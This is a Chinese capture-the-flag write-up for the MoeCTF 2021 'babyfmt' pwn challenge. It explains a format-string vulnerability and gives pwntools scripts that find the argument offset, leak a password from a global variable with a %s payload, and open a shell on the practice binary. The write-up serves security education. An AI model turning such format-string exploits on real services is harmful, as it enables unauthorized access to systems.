# [MoeCTF 2021]babyfmt_WP

**利用格式化字符串漏洞获取所需信息**

> **平台**：NSSCTF  
> **方向**：Pwn  
> **知识点**：格式化字符串  
> **难度**：中等

## 一、信息获取

![image01](/pwn/[MoeCTF%202021]babyfmt_WP/image/image01.png)

checksec：有NX、canary保护，无PIE

## 二、分析

![image02](/pwn/[MoeCTF%202021]babyfmt_WP/image/image02.png)

分析伪代码，逻辑为将密码存入`buf_`,然后需要输入密码，比对成功即可进入shell

`buf_`为全局变量，但其地址可以直接在ida里查看，并且程序无PIE

**因此思路为**：通过%s获取`buf_`里面的密码

## 三、EXP

先获取参数偏移量

```python
from pwn import *

context(os="linux", arch="i386", log_level="info")
io= process('./pwn')
io.recvuntil("your name:")
io.send(b"AAAA" + b"-%p"*20)
io.recvuntil("Hello,")
leak = io.recvuntil("your passwd:")
print(leak)
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/9ff84725a8c24af5abb46ca25065c680.png)
参数偏移量为10
#### exp
```pyhton
from pwn import *

buf=0x804C044
offset = 10

io = remote(...)

payload = p32(buf) + f"%{offset}$s".encode()

io.recvuntil(b"your name:")
io.send(payload)
io.recvuntil(b"Hello,")
leak = io.recvuntil(b"your passwd:",drop=True)

# 前 4 字节是塞进去的地址，后面才是 %s 打出来的内容
password = u32(leak[4:8].ljust(4, b"\x00"))
# 按有符号 int 比较，负数要带负号
if password >= 0x80000000:
    password -= 0x100000000

io.sendline(str(password).encode())
io.interactive()
```

这里可能要多试几次，因为%s遇到/00就停止，如果密码中存在0，就会导致密码提取不全

## 四、总结

格式化字符串漏洞利用

思路仅供参考，如有疑问或发现疏漏，欢迎各位师傅在评论区指正交流。
